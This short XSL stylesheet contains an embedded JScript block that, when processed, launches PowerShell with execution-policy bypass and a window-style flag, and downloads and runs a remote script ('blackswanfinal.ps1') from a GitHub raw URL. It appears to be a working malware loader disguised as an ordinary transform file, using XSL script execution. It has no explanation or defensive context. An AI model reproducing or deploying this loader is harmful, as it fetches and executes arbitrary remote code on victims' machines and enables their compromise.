<?xml version='1.0'?>
<stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder" version="1.0">
<output method="text"/>
<ms:script implements-prefix="user" language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run ("powershell -ep bypass -win 1 -nop IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/section10housing/b1/master/blackswanfinal.ps1')");
]]> 
</ms:script>
</stylesheet>